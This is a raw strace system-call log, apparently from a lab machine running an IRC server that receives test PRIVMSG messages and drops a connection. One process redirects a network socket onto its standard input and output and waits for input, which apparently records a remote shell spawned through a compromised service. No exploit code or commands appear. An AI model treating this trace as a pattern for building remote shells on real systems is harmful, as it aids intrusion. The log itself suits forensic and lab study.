10196 07:31:51.372443 close(6)          = 0
10196 07:31:51.372512 dup(8)            = 6
10196 07:31:51.372525 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc57488) = -1 EINVAL (Invalid argument)
10196 07:31:51.372536 _llseek(6, 0, 0xbfc574d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.372581 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10196 07:31:51.372636 dup2(6, 1)        = 1
10196 07:31:51.372649 close(6)          = 0
10196 07:31:51.372660 fcntl64(1, F_SETFD, 0) = 0
10196 07:31:51.372671 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc57458) = -1 EINVAL (Invalid argument)
10196 07:31:51.372682 _llseek(1, 0, 0xbfc574a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.372726 dup(8)            = 6
10196 07:31:51.372738 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc57488) = -1 EINVAL (Invalid argument)
10196 07:31:51.372749 _llseek(6, 0, 0xbfc574d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.372758 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10196 07:31:51.372774 dup2(6, 0)        = 0
10196 07:31:51.372784 close(6)          = 0
10196 07:31:51.372793 fcntl64(0, F_SETFD, 0) = 0
10196 07:31:51.372806 fcntl64(0, F_SETFD, 0) = 0
10196 07:31:51.372822 read(0,  <unfinished ...>
4519  07:31:51.373152 <... select resumed> ) = 1 (in [5], left {0, 650000})
4519  07:31:51.373205 clock_gettime(CLOCK_MONOTONIC, {2321, 190235416}) = 0
4519  07:31:51.373237 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:31:51.373250 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:31:51.373271 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:31:51.373287 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:31:51.373334 close(5)          = 0
4519  07:31:51.373349 gettimeofday({1495625511, 373353}, NULL) = 0
4519  07:31:51.373361 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 910000})
4519  07:31:51.454907 clock_gettime(CLOCK_MONOTONIC, {2321, 271930745}) = 0
4519  07:31:51.454935 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:31:51.454967 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.454991 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455012 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455032 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455072 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455113 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455167 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455187 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455206 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455282 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455361 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455382 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455402 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455422 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455451 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455487 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455506 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455602 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455658 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455713 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455801 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455849 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.455906 time(NULL)        = 1495625511
4519  07:31:51.455938 time(NULL)        = 1495625511
4519  07:31:51.455966 gettimeofday({1495625511, 455992}, NULL) = 0
4519  07:31:51.456000 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:31:51.456089 clock_gettime(CLOCK_MONOTONIC, {2321, 273102497}) = 0
4519  07:31:51.456117 gettimeofday({1495625511, 456120}, NULL) = 0
4519  07:31:51.456148 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 900000})
4519  07:31:51.554038 clock_gettime(CLOCK_MONOTONIC, {2321, 371056079}) = 0
4519  07:31:51.554061 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 44
4519  07:31:51.554089 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554106 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554121 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554136 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554150 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554164 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554178 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554192 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554205 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554219 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554233 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554247 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554260 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554275 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554288 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554302 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554316 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554330 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554344 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554358 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554392 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554424 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.554487 gettimeofday({1495625511, 554493}, NULL) = 0
4519  07:31:51.554521 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
